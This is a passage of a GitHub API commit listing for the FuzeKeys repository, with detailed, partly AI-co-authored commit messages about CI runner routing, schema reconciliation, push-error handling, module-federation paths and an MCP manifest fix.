  New `.github/workflows/gate-fuze-code-action.yml` runs all five on any PR\n   touching `.github/actions/fuze-code-action/**` or `llm-endpoint/**`.\n\nNew `__tests__/test_run_blocks_parse.py` extracts every `run:` block from both\nactions, substitutes `${{ }}` (the runner does that before bash sees it), and\n`bash -n` parses each one. Not a correctness check and not claimed to be — it\ncatches exactly this class: unterminated strings, unbalanced heredocs, unclosed\n`if`/`for`/`case`. Verified by mutation: reintroducing the shipped `''\"''\"''`\nsequence fails it with \"unexpected EOF while looking for matching `\"''\".\n\n* fix(ci): stranded on ubuntu-latest — the preflight red was never about credentials\n\nI called the a2a/mcp-maintain preflight failures a missing-credential problem and\nsaid the fix was minting secrets. That was wrong, and the evidence corrects it\ncleanly.\n\nFuzeDeploy run 32778573184, two jobs, same workflow:\n\n    mcp-maintain preflight  labels: [\"ubuntu-latest\"]  failure  3s  no runner id, no log\n    mcp-maintain            labels: [\"fuzedeploy\"]     skipped        (needs: preflight)\n\nA job that fails in three seconds with no runner assigned and no downloadable log\ndid not run and fail — it NEVER STARTED. On a private repo whose Actions budget is\nexhausted, a GitHub-hosted job is simply refused. The correlation is exact: the 13\nrepos that declare `ci.runner` are precisely the ones where every `ubuntu-latest`\njob dies this way, and the 4 that declare none (FuzeFront, FuzeKeys, FuzeX,\nFuzeAgent) are precisely the ones where preflight passes. Credentials never came\ninto it.\n\nThe trap is already documented in this repo — reusable-claude-ci-autofix.yml spells\nit out verbatim — and I read that comment this afternoon and then hard-coded\n`ubuntu-latest` in a brand-new workflow anyway.\n\nThree changes:\n\n  - a2a-maintain.yml / mcp-maintain.yml preflight -> the repo''s ci.runner. The\n    installer had rewritten the MAINTAINER job to the scale set and left the\n    preflight behind, so `needs: preflight` killed the whole workflow. a2a/mcp\n    maintenance has been dead in these repos and has been reading as a\n    credential gap the whole time.\n  - gate-fuze-code-action.yml -> the repo''s ci.runner (ubuntu-latest only where\n    no runner is declared).\n  - actions/setup-python pinned to a26af69be951a213d495a4c3e4e4022e16d87065 (v5)\n    instead of the mutable @v5 tag — flagged by Semgrep''s\n    github-actions-mutable-action-tag on FuzeKeys#109, and the SHA already in use\n    by harden-gate.yml in these same repos.\n\n* fix(gate-manifest): reconcile the vendored schema — it rejected a key the canonical allows\n\ngate-manifest failed on FuzeMerchandize#34 and FuzeFinance#35:\n\n    gate-manifest: 1 violation(s)\n      ✗ ci — Additional properties are not allowed (''note'' was unexpected)\n\nThe manifests are not wrong. FuzeSDLC''s canonical governance/repo-manifest.schema.json\ndeclares `note` on the `ci` block with a description; the VENDORED\n.fuze/repo-manifest.schema.json in these repos predates that and still sets\n`additionalProperties: false` without it. A stale MANAGED file, rejecting a field the\nsource of truth explicitly permits.\n\nReconciled from the canonical. Verified before writing: all 17 repos'' manifests\nvalidate cleanly against the canonical schema under jsonschema Draft 2020-12, so this\nturns two reds green and introduces none.\n\nScope note — measured, not assumed:\n  * 6 repos define the gate-manifest job AND ship scripts/gate_manifest.py; those are\n    the copies reconciled here.\n  * 11 repos have NEITHER the job nor the script. Consistent, so nothing is passing\n    vacuously there, and their stale schema is inert. Left alone rather than adding\n    unrelated churn to a CI-routing PR — it is rollout backlog, not a defect.\n  * FuzeHub has no vendored schema at all.\n\nThe drift itself is worth naming: every vendored copy differs from the canonical, and\nthis one only surfaced because the runner fix let the job actually execute. A MANAGED\nfile that nothing reconciles is a latent version of exactly this failure.\n\n* chore(governance): reconcile managed files to FuzeSDLC v1 [skip ci]\n\n* fix(governance-sync): a 403 is not a race — and FuzeHub could never push at all\n\nThe rebase-and-retry loop I added earlier had a real defect, and FuzeHub exposed it\nwithin the hour. From its job log:\n\n    remote: Write access to repository not granted.\n    fatal: ... The requested URL returned error: 403\n    ::notice::push rejected (attempt 1/3) — the branch moved under us; rebasing...\n    Current branch chore/fuze-code-action is up to date.\n\nThe loop retried a PERMISSION failure three times while announcing \"the branch moved\nunder us\" — with git''s own next line flatly contradicting it. A diagnostic that names\nthe wrong cause is worse than no diagnostic: it sends the reader looking for a race\nthat never happened.\n\nNow the loop reads the push output and separates the two. A 403 / \"Write access not\ngranted\" / \"Permission denied\" fails IMMEDIATELY with a message naming the actual\ncause and where to look. Only a genuine rejection is retried.\n\nAnd the underlying FuzeHub finding, which is the more serious half:\n\n  permissions:\n    contents: read  # read-only; commit-back uses the SSH deploy key via git\n                    # remote reconfiguration\n\nThere is no such reconfiguration in that file. The one `ssh-key:` present is on the\ncheckout of the FuzeSDLC canonical into .fuzesdlc-canonical — a READ of another repo,\nnot the push remote for this one. So the comment described a mechanism that does not\nexist, and the push could never succeed. Every run computed a reconciliation and threw\nit away.\n\nThat was invisible for as long as the old `|| echo \"::warning::commit-back push failed\n(token may be read-only)\"` stood: a push failure could not fail anything, so FuzeHub''s\ngovernance reconciliation has silently not been landing. Removing the soft-fail is what\nsurfaced it, which was the stated reason for removing it.\n\nSet to `contents: write`, matching the canonical, and the false comment replaced with\nthe record of what actually happened.\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>\nCo-authored-by: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqjMX2CRC1aQ7uu5UhlAAAbFIQAK6VeWXIBc3I66vmrDrAgjbK\n7/yYDxZY2/4D6UP7pHZxz+h79jEREnhgHwaxwyCBxghLsZGEDb1FW7XbiSXmyx4q\n3w14qi6XSqzbmM00HwnkfPp/7at6gmpdtWo9dxPw6mAtTmm7rwcA3T5/iJoVu97w\nrwleSSXkE73Rwjg5oZGBWScVnKY+fE1VlYso0BvhOJDDS6Zieqy1pWNXOco4YWc/\nqQKaaurpKZd9TzHAZ7ONmbafo1Oyx/xwDVAN0dn77+0wzTCCUA4S+k74VRp2s/FP\noAvk1rtV441XML+ggmEh17PRhN6QQJw79wCzfk6kZoewWhIGwLOupYP2Fm2N3Qzb\nhX3wjAVsVrHeby2B98jjDUEICdmpbKPsJ6sBT8DOdORiLbfyusFEb4EraIERSjAH\nqIH6/Zcf3oyOLWIZh140YEmMxGFwuFfTvzKZiOjau+mK/nANOsxrJCP2eu9JyD/H\n+ets9lT/5bmSd2Wzt4TNOKIiKM43Id5DUFTvkxnSTOr0rqFUSyZCU3ZIf7N5vvJi\nzHOkXpBjUIUCGbb14AuTZB9lQZHHBzFN/NDdxepXphKDLDKHfvbTqsap9VGrpGw/\nNoeRhFejg8QOmWM2HBDUFFB4bVTVr2H2nfFiR56Iwb/caxh/rd5781j2XGI1wB/r\nu9BGYclRRUitZ2iaUu8t\n=9n9i\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-24T22:30:15Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/b67ed2204d647b91fa900ae8e45ef44da0177fff","node_id":"C_kwDOO0IuAdoAKGI2N2VkMjIwNGQ2NDdiOTFmYTkwMGFlOGU0NWVmNDRkYTAxNzdmZmY","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/4ca70f4f92322f3e4bf4c7e629256c0beb789520","sha":"4ca70f4f92322f3e4bf4c7e629256c0beb789520","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/4ca70f4f92322f3e4bf4c7e629256c0beb789520"}],"sha":"b67ed2204d647b91fa900ae8e45ef44da0177fff","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/b67ed2204d647b91fa900ae8e45ef44da0177fff"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/u/99821070?v=4","events_url":"https://api.github.com/users/izzywdev/events{/privacy}","followers_url":"https://api.github.com/users/izzywdev/followers","following_url":"https://api.github.com/users/izzywdev/following{/other_user}","gists_url":"https://api.github.com/users/izzywdev/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/izzywdev","id":99821070,"login":"izzywdev","node_id":"U_kgDOBfMmDg","organizations_url":"https://api.github.com/users/izzywdev/orgs","received_events_url":"https://api.github.com/users/izzywdev/received_events","repos_url":"https://api.github.com/users/izzywdev/repos","site_admin":false,"starred_url":"https://api.github.com/users/izzywdev/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/izzywdev/subscriptions","type":"User","url":"https://api.github.com/users/izzywdev","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/4ca70f4f92322f3e4bf4c7e629256c0beb789520/comments","commit":{"author":{"date":"2026-08-24T21:30:03Z","email":"99821070+izzywdev@users.noreply.github.com","name":"Israel Weinberg"},"comment_count":0,"committer":{"date":"2026-08-24T21:30:03Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(federation): serve and advertise remoteEntry same-origin at the same path (#108)\n\n* fix(federation): serve and advertise remoteEntry same-origin at the same path\n\nTwo defects that compound into one symptom: the FuzeKeys panel fails to load in\nthe portal.\n\n1. The registration manifest advertised an ABSOLUTE cross-origin URL\n\n       https://keys.prod.fuzefront.com/apps/fuzekeys/remoteEntry.js\n\n   FuzeFront''s host resolves integration.remoteEntry against its OWN origin\n   (frontend/src/utils/loadFederatedApp.ts). Pointing it at keys.prod means the\n   portal must reach that host directly and CORS-clean — and keys.prod sits\n   behind Cloudflare Access, so the browser gets \"refused to connect\" rather\n   than a remote.\n\n   Everything needed for the same-origin mount was ALREADY built and enabled:\n\n     - deploy/helm/fuzekeys/templates/federated-mount-ingress.yaml routes\n       {host}/apps/fuzekeys/* to the frontend Service, pass-through, no rewrite\n     - values-contabo.yaml: federatedMount.enabled=true, host=app.fuzefront.com,\n       path=/apps/fuzekeys\n     - frontend/nginx.conf: location ^~ /apps/fuzekeys/ with a matching alias\n     - frontend/Dockerfile copies dist-mfe -> html/apps/fuzekeys\n     - frontend/vite.config.ts: base ''/apps/fuzekeys/''\n\n   The chart''s own header comment says the point is that the portal \"imports the\n   remote SAME-ORIGIN — no iframe, no CORS, no mixed-content\". The infrastructure\n   was correct; only the manifest never followed it.\n\n2. assetsDir was unset, so the entry is not served where the manifest says\n\n   Vite''s default assetsDir is ''assets'', so remoteEntry.js was emitted to\n   dist-mfe/assets/remoteEntry.js and served at\n\n       /apps/fuzekeys/assets/remoteEntry.js\n\n   while the manifest advertises /apps/fuzekeys/remoteEntry.js. nginx ends that\n   location in `try_files $uri $uri/ =404`, so the advertised path 404s. This is\n   the one remote in the family missing `assetsDir: ''''`; FuzeX''s config states\n   the reason outright (\"so remoteEntry.js is served at /apps/fuzex/...\").\n\n   Fixing only the origin would have left a cross-path mismatch behind, so both\n   halves are here.\n\nNot changed: `singleton` is deliberately still absent from the shared config,\nand the existing comment saying so is correct. Verified against the packaged\nplugin — @originjs/vite-plugin-federation@1.4.1 contains ZERO occurrences of\n\"singleton\" in its dist, and its own types file has `// singleton?: boolean`\ncommented out. `requiredVersion` is read (dist/index.js:632, :956) and is\nalready ''^19.0.0'' here, matching the host. Adding `singleton: true` would be\ndead config that only breaks `tsc --noEmit`.\n\nBoth copies of the manifest are updated and verified byte-identical.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* chore(chart): bump appVersion 0.1.9 -> 0.1.10 and chart 0.1.10 -> 0.1.11\n\nrelease-version caught this correctly. The federation fix changes shipped\nfrontend code (vite.config.ts assetsDir moves remoteEntry.js and every chunk\nfrom /apps/fuzekeys/assets/ to /apps/fuzekeys/), so the image content changes.\nLeaving appVersion at 0.1.9 would rebuild those images under a tag the cluster\nalready runs — Argo would see no chart change and roll out nothing, and the\nfix would look merged while prod kept serving the old layout.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>","tree":{"sha":"70022321607e22a68dca84284ac216a1f782e0e6","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/70022321607e22a68dca84284ac216a1f782e0e6"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/4ca70f4f92322f3e4bf4c7e629256c0beb789520","verification":{"payload":"tree 70022321607e22a68dca84284ac216a1f782e0e6\nparent fb2531a578a1ec6ee8cfa610da32dbe364d40546\nauthor Israel Weinberg <99821070+izzywdev@users.noreply.github.com> 1787607003 +0300\ncommitter GitHub <noreply@github.com> 1787607003 +0300\n\nfix(federation): serve and advertise remoteEntry same-origin at the same path (#108)\n\n* fix(federation): serve and advertise remoteEntry same-origin at the same path\n\nTwo defects that compound into one symptom: the FuzeKeys panel fails to load in\nthe portal.\n\n1. The registration manifest advertised an ABSOLUTE cross-origin URL\n\n       https://keys.prod.fuzefront.com/apps/fuzekeys/remoteEntry.js\n\n   FuzeFront''s host resolves integration.remoteEntry against its OWN origin\n   (frontend/src/utils/loadFederatedApp.ts). Pointing it at keys.prod means the\n   portal must reach that host directly and CORS-clean — and keys.prod sits\n   behind Cloudflare Access, so the browser gets \"refused to connect\" rather\n   than a remote.\n\n   Everything needed for the same-origin mount was ALREADY built and enabled:\n\n     - deploy/helm/fuzekeys/templates/federated-mount-ingress.yaml routes\n       {host}/apps/fuzekeys/* to the frontend Service, pass-through, no rewrite\n     - values-contabo.yaml: federatedMount.enabled=true, host=app.fuzefront.com,\n       path=/apps/fuzekeys\n     - frontend/nginx.conf: location ^~ /apps/fuzekeys/ with a matching alias\n     - frontend/Dockerfile copies dist-mfe -> html/apps/fuzekeys\n     - frontend/vite.config.ts: base ''/apps/fuzekeys/''\n\n   The chart''s own header comment says the point is that the portal \"imports the\n   remote SAME-ORIGIN — no iframe, no CORS, no mixed-content\". The infrastructure\n   was correct; only the manifest never followed it.\n\n2. assetsDir was unset, so the entry is not served where the manifest says\n\n   Vite''s default assetsDir is ''assets'', so remoteEntry.js was emitted to\n   dist-mfe/assets/remoteEntry.js and served at\n\n       /apps/fuzekeys/assets/remoteEntry.js\n\n   while the manifest advertises /apps/fuzekeys/remoteEntry.js. nginx ends that\n   location in `try_files $uri $uri/ =404`, so the advertised path 404s. This is\n   the one remote in the family missing `assetsDir: ''''`; FuzeX''s config states\n   the reason outright (\"so remoteEntry.js is served at /apps/fuzex/...\").\n\n   Fixing only the origin would have left a cross-path mismatch behind, so both\n   halves are here.\n\nNot changed: `singleton` is deliberately still absent from the shared config,\nand the existing comment saying so is correct. Verified against the packaged\nplugin — @originjs/vite-plugin-federation@1.4.1 contains ZERO occurrences of\n\"singleton\" in its dist, and its own types file has `// singleton?: boolean`\ncommented out. `requiredVersion` is read (dist/index.js:632, :956) and is\nalready ''^19.0.0'' here, matching the host. Adding `singleton: true` would be\ndead config that only breaks `tsc --noEmit`.\n\nBoth copies of the manifest are updated and verified byte-identical.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* chore(chart): bump appVersion 0.1.9 -> 0.1.10 and chart 0.1.10 -> 0.1.11\n\nrelease-version caught this correctly. The federation fix changes shipped\nfrontend code (vite.config.ts assetsDir moves remoteEntry.js and every chunk\nfrom /apps/fuzekeys/assets/ to /apps/fuzekeys/), so the image content changes.\nLeaving appVersion at 0.1.9 would rebuild those images under a tag the cluster\nalready runs — Argo would see no chart change and roll out nothing, and the\nfix would look merged while prod kept serving the old layout.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n---------\n\nCo-authored-by: Claude <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqjLfbCRC1aQ7uu5UhlAAAiDEQAIARmRHVpJQ6mM+RZ4fNY84t\nMoNAvcaJh3ae47SrFHLW+kbNRrowmuyywpFGhaF23syX06XTpjam11WKMvb0Jge5\nj9+k6nbAmUgqnGYwamgYh2eu4tFiv5AtMirCMJZedIHa/Z+zBH12VhGN5OLOY0E+\ntfomBVUVvEJwzkjS74oGQ2dV7AERM5Z1COTGEDGnRWF9KABlFqsm3kIZMQYNQvvS\nyS3aneR094FvV4v2SSQUbzhHKOAgqVZOV1b9JYu3oTShyZ6m1Cv1Ii9HAaLyu/Fj\nf6vMVJ/4Bg0/29TZptNZSCow21ls9BKKJyOSXdvRVKSTMSQn5rdYDYciBcmBJ5FL\nQ1vEX/fdnCsOsrxGFEDcAn4vdwaQlOcRgO3XLw7XjmnsMFo9sZd4yxjPMmxqOoqD\nm2zbAO9lCm6D9NIzaVpBKvELc8rKUBMuzDnQPl1TChqa/RyShOuKcDEMmkciNFia\nCPaBcuihHhljd1tDKnCGR3oTOPycTRz/ia6exGyt1XCq2O8do6ie8G1yniX7ickO\n3dpCrUYTH3+1OPuy+31vHKN5TVziTi7BtJPpbJ/293xcKH5IpFmy/QY8ps7q6jS8\n/yQogEIgEKM5pkBdOnWBXj4Ir783Fq558f0VR0q82iaZbmtQ2vQyAAlU+JUwkH0n\nQLn96+JVXWsEUlXvwXS1\n=Gvvq\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-24T21:30:04Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/4ca70f4f92322f3e4bf4c7e629256c0beb789520","node_id":"C_kwDOO0IuAdoAKDRjYTcwZjRmOTIzMjJmM2U0YmY0YzdlNjI5MjU2YzBiZWI3ODk1MjA","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/fb2531a578a1ec6ee8cfa610da32dbe364d40546","sha":"fb2531a578a1ec6ee8cfa610da32dbe364d40546","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/fb2531a578a1ec6ee8cfa610da32dbe364d40546"}],"sha":"4ca70f4f92322f3e4bf4c7e629256c0beb789520","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/4ca70f4f92322f3e4bf4c7e629256c0beb789520"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/1236702?v=4","events_url":"https://api.github.com/users/claude%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/claude%5Bbot%5D/followers","following_url":"https://api.github.com/users/claude%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/claude%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/claude","id":209825114,"login":"claude[bot]","node_id":"BOT_kgDODIGtWg","organizations_url":"https://api.github.com/users/claude%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/claude%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/claude%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/claude%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/claude%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/claude%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/fb2531a578a1ec6ee8cfa610da32dbe364d40546/comments","commit":{"author":{"date":"2026-08-23T11:03:10Z","email":"209825114+claude[bot]@users.noreply.github.com","name":"claude[bot]"},"comment_count":0,"committer":{"date":"2026-08-23T11:03:10Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(ci): adopt the proven multi-vendor llm-endpoint fallback chain (#107)\n\na2a-maintain/mcp-maintain preflight hard-fails with \"LITELLM_FUZE_KEY is not\nset\" whenever the manifest declares a2a.enabled/mcp.enabled and only that one\nLiteLLM virtual key secret is configured — the old pre-fallback-chain contract.\nFuzeFront#782 fixed this with a real LiteLLM -> anthropic|openai|gemini fallback\nchain (a runner-local LiteLLM proxy that walks configured vendors on\nquota/rate-limit/auth errors, not just transport failure); proven working:\nFuzeFront#783/#784/#786 went red -> green once #782 merged.\n\nVendor that composite action (.github/actions/llm-endpoint) and re-stamp a2a-maintain.yml mcp-maintain.yml\nto the same pattern here, so this repo''s declared A2A/MCP surface can be\nmaintained off LITELLM_FUZE_KEY OR any configured provider key, and both the\npreflight AND each maintainer job''s own credential resolution route through the\nsame chain (not preflight alone).\n\nCo-authored-by: Claude <noreply@anthropic.com>","tree":{"sha":"fdf25f56aaacd59468042017dfccb844188be616","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/fdf25f56aaacd59468042017dfccb844188be616"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/fb2531a578a1ec6ee8cfa610da32dbe364d40546","verification":{"payload":"tree fdf25f56aaacd59468042017dfccb844188be616\nparent 833e50b75da637ce2ed197ce048fd917fa9ad5f6\nauthor claude[bot] <209825114+claude[bot]@users.noreply.github.com> 1787482990 +0300\ncommitter GitHub <noreply@github.com> 1787482990 +0300\n\nfix(ci): adopt the proven multi-vendor llm-endpoint fallback chain (#107)\n\na2a-maintain/mcp-maintain preflight hard-fails with \"LITELLM_FUZE_KEY is not\nset\" whenever the manifest declares a2a.enabled/mcp.enabled and only that one\nLiteLLM virtual key secret is configured — the old pre-fallback-chain contract.\nFuzeFront#782 fixed this with a real LiteLLM -> anthropic|openai|gemini fallback\nchain (a runner-local LiteLLM proxy that walks configured vendors on\nquota/rate-limit/auth errors, not just transport failure); proven working:\nFuzeFront#783/#784/#786 went red -> green once #782 merged.\n\nVendor that composite action (.github/actions/llm-endpoint) and re-stamp a2a-maintain.yml mcp-maintain.yml\nto the same pattern here, so this repo''s declared A2A/MCP surface can be\nmaintained off LITELLM_FUZE_KEY OR any configured provider key, and both the\npreflight AND each maintainer job''s own credential resolution route through the\nsame chain (not preflight alone).\n\nCo-authored-by: Claude <noreply@anthropic.com>","reason":"valid","signature":"-----BEGIN PGP SIGNATURE-----\n\nwsFcBAABCAAQBQJqitNuCRC1aQ7uu5UhlAAAehUQAAK9qphOvvLfDgASMt7uKp8Y\nP6NT2ZedgaVmR7CjIVRAQdEY8eU50LHLE48Rgy/aPG8KUQaJ7jq5M4dQ7bVAEXie\nlrty36zGeDA6zSOWMYV1sfpAaMMMORpKGpLweJlsFVWK4QTznvn/ykllpsMEsMqt\niNU6jd3J8qFC13pENxyQjFEiworYHt5TeqWzyoRUtLpRahnlx9PjxPxSWKnmKTOK\nTWFZgaLpHlU/Cswqlo85bQFAFgNJzwgXGlPf5MevN45LRGA7v8FP9gZefJnyl5cZ\n/aztT/W3O17mw3aZaMLteOGJj54EIk6FYz3pkJIBY46jxVfpinnYdAO3eb0/wZpm\nx7tDisSG0EeYLejxLU1ZeJgS0Ir6V+TWh/Xknj7FVABtmMm9ZfonJE/D+Tag/wfC\nnaHhIf/bNa9wde77IUGHflLwQR9ijrPNvelFICBXdo+TjQU2KBdvchpkwl+tXI4y\nTuez7mjghue6A8OqnGrxWID+S4yIJkVMJIZsU0asf/jm2FT27TM4Ll5rQoCfVTBc\nuU+V5miSdT+mZmFs4dPDznA+gk2MN/VkLoX+Q+Rdj6yRy2PosO9waD+lTqixzxdf\nhDYYhh5KfKhWpLuZ5u4G9Sg8DX8qfmN2o6eJUSCD7oPNR/5XzKTlkAP3g5nndklC\n7jKGO2EwQc5a3ccjIcN7\n=VwnY\n-----END PGP SIGNATURE-----\n","verified":true,"verified_at":"2026-08-23T11:03:10Z"}},"committer":{"avatar_url":"https://avatars.githubusercontent.com/u/19864447?v=4","events_url":"https://api.github.com/users/web-flow/events{/privacy}","followers_url":"https://api.github.com/users/web-flow/followers","following_url":"https://api.github.com/users/web-flow/following{/other_user}","gists_url":"https://api.github.com/users/web-flow/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/web-flow","id":19864447,"login":"web-flow","node_id":"MDQ6VXNlcjE5ODY0NDQ3","organizations_url":"https://api.github.com/users/web-flow/orgs","received_events_url":"https://api.github.com/users/web-flow/received_events","repos_url":"https://api.github.com/users/web-flow/repos","site_admin":false,"starred_url":"https://api.github.com/users/web-flow/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/web-flow/subscriptions","type":"User","url":"https://api.github.com/users/web-flow","user_view_type":"public"},"html_url":"https://github.com/izzywdev/FuzeKeys/commit/fb2531a578a1ec6ee8cfa610da32dbe364d40546","node_id":"C_kwDOO0IuAdoAKGZiMjUzMWE1NzhhMWVjNmVlOGNmYTYxMGRhMzJkYmUzNjRkNDA1NDY","parents":[{"html_url":"https://github.com/izzywdev/FuzeKeys/commit/833e50b75da637ce2ed197ce048fd917fa9ad5f6","sha":"833e50b75da637ce2ed197ce048fd917fa9ad5f6","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/833e50b75da637ce2ed197ce048fd917fa9ad5f6"}],"sha":"fb2531a578a1ec6ee8cfa610da32dbe364d40546","url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/fb2531a578a1ec6ee8cfa610da32dbe364d40546"},{"author":{"avatar_url":"https://avatars.githubusercontent.com/in/15368?v=4","events_url":"https://api.github.com/users/github-actions%5Bbot%5D/events{/privacy}","followers_url":"https://api.github.com/users/github-actions%5Bbot%5D/followers","following_url":"https://api.github.com/users/github-actions%5Bbot%5D/following{/other_user}","gists_url":"https://api.github.com/users/github-actions%5Bbot%5D/gists{/gist_id}","gravatar_id":"","html_url":"https://github.com/apps/github-actions","id":41898282,"login":"github-actions[bot]","node_id":"MDM6Qm90NDE4OTgyODI=","organizations_url":"https://api.github.com/users/github-actions%5Bbot%5D/orgs","received_events_url":"https://api.github.com/users/github-actions%5Bbot%5D/received_events","repos_url":"https://api.github.com/users/github-actions%5Bbot%5D/repos","site_admin":false,"starred_url":"https://api.github.com/users/github-actions%5Bbot%5D/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/github-actions%5Bbot%5D/subscriptions","type":"Bot","url":"https://api.github.com/users/github-actions%5Bbot%5D","user_view_type":"public"},"comments_url":"https://api.github.com/repos/izzywdev/FuzeKeys/commits/833e50b75da637ce2ed197ce048fd917fa9ad5f6/comments","commit":{"author":{"date":"2026-08-23T06:39:40Z","email":"41898282+github-actions[bot]@users.noreply.github.com","name":"github-actions[bot]"},"comment_count":0,"committer":{"date":"2026-08-23T06:39:40Z","email":"noreply@github.com","name":"GitHub"},"message":"fix(manifest): declare the MCP gateway this repo deploys in prod (#105)\n\n* fix(manifest): declare the MCP gateway this repo deploys in prod\n\n.fuze/manifest.json said mcp.enabled:false with a stdio server at\nmcp/server.py. That file has never existed, and\ndeploy/helm/fuzekeys/values-contabo.yaml - the only valueFile the Argo\nApplication lists - has set mcp.enabled:true since #65 (2026-08-10). The\nfuzekeys-mcp pod is deployed in production and BROKEN\n(CreateContainerConfigError, observed 2026-08-21).\n\nSwitches the block to the gateway dialect (image/spec/overrides/deployment/\nendpoints) and to enabled:true. The credential-vault classification constraint\nfrom the old note is carried over verbatim. No code is touched.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n* fix(manifest): state the verified downstream effect, not the assumed one\n\nThe note claimed flipping this flag makes the maintain preflight \"go red for\nwant of LITELLM_FUZE_KEY\". That was repeated, not checked, and it is wrong:\nthe maintain workflow runs on every pull_request, is gated on\nsecrets.ANTHROPIC_API_KEY (not LITELLM_FUZE_KEY), and on a missing key emits a\n::notice:: and SUCCEEDS. Nothing in these repos'' CI reads the enabled flag at\nall - verified by reading the workflows.\n\nWhat the flag actually steers is the maintainer AGENT the workflow runs, whose\nprompt reads this block and is told never to flip enabled:true for a surface\nwith nothing behind it. So the vacuous gate was this manifest, not the\nworkflow - and nothing in CI cross-checks the manifest against the chart, which\nis why the contradiction survived.\n\nAsserting an unverified mechanism is the exact failure this sweep exists to\nremove, so it is corrected here rather than left standing.\n\nCo-Authored-By: Claude Opus 5 <noreply@anthropic.com>\nClaude-Session: https://claude.ai/code/session_01GaPa3JgrVNtWrGvqQEAEqv\n\n---------\n\nCo-authored-by: Claude <izzy.weinberg@gmail.com>\nCo-authored-by: Claude Opus 5 <noreply@anthropic.com>","tree":{"sha":"2d76239efd3bb0ba8526cf14c6c3fc118d22d039","url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/trees/2d76239efd3bb0ba8526cf14c6c3fc118d22d039"},"url":"https://api.github.com/repos/izzywdev/FuzeKeys/git/commits/833e50b75da637ce2ed197ce048fd917fa9ad5f6","verification":{"payload":"tree 